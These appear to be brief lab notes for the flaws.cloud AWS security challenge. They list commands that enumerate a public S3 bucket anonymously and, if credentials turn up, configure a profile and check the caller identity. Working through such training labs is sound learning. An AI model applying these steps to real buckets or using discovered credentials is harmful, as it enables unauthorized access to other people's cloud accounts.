nslookup flaws.cloud

hostname 52.218.228.122

aws s3 ls s3://flaws.cloud --region us-west-2 --no-sign-request
 
curl flaws.cloud.s3.amazonaws.com | xmllint -format
curl flaws.cloud.s3.amazonaws.com | xmllint -format -

mkdir .aws
gedit .aws/credentials

If you find credentials, make account and see account properties:
aws configure --profile havoc
aws --profile havoc sts get-caller-identity

![unnamed_0f5ccf7d1d9549da8d61d71938c77aab](unnamed_0f5ccf7d1d9549da8d61d71938c77aab.png)
![unnamed_b7700d40124041b880f497b7238a948e](unnamed_b7700d40124041b880f497b7238a948e.png)
